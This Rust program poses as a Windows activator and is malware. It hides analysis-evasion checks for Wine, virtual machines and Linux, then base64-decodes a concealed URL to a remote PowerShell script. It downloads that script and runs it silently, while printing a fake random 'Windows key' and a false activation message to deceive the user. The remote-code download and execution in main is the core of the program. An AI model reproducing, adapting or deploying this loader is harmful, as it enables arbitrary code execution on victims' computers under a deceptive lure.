use base64;
use libloading::Library;
use rand::{distributions::Alphanumeric, Rng};
use reqwest;
use std::process::{Command, Output};
use vm_detect::{vm_detect, Detection};

fn is_running_under_wine() {
    unsafe {
        #[allow(unused_variables)]
        if let Ok(lib) = Library::new("ntdll.dll") {
            println!(
                "
    ırmaklarından şaraplar akacak diyorsun
    cennet-i alâ meyhane midir?
    her mümin'e iki huri diyorsun
    cennet-i alâ kerhane midir?
                "
            );
            std::process::exit(0);
        }
    }
}

fn generate_key() -> String {
    let random_string: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    let hash = md5::compute(random_string.as_bytes());
    let output = format!("ABİ{{{:?}}}", hash);
    output
}

fn is_linux() {
    match std::env::consts::OS {
        "linux" => {
            println!("Can't activate Windows on this OS dumbass!");
            std::process::exit(0);
        }
        _ => {}
    }
}

fn run_command(command: &String) -> Output {
    let output = Command::new("powershell")
        .arg("-Commanda")
        .arg(command)
        .arg("|")
        .arg("Out-Null")
        .output()
        .expect("Run command again!");
    output
}

fn is_running_in_vm() {
    let detection = vm_detect();
    if detection.contains(Detection::HYPERVISOR_BIT) {
        println!(
            "
        Sanal dünya, kodların dans ettiği yer,
        Programlar koşar, sınırlar kalkar gider.
        RAM'de hayat bulur, işlemci hızla döner,
        Sanal makine, hayallerin gerçek olduğu yer.
            "
        );
        std::process::exit(0)
    }
}

#[tokio::main]
async fn main() {
    is_running_under_wine();
    is_running_in_vm();
    is_linux();
    let b64_string =
        "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VsMG1hci9sZWdlbmRhcnktdHJhaW4vcmVmcy9oZWFkcy9tYWluL3NjcmlwdC5wczEK";

    #[allow(deprecated)]
    let decoded_bytes = base64::decode(b64_string).expect("Something went wrong.");
    let decoded_string = String::from_utf8(decoded_bytes).expect("Something went wrong.");
    let url = decoded_string;
    let windows_key = generate_key();
    match reqwest::get(url).await {
        Ok(response) => {
            if let Ok(command) = response.text().await {
                println!("Windows Key has been initialized: {}", windows_key);
                run_command(&command);
                println!("Windows has been activated succesfully!");
            }
        }
        Err(_e) => {
            eprintln!(
                "An error was encountered while generating your Windows key, please run it again."
            );
        }
    }
}
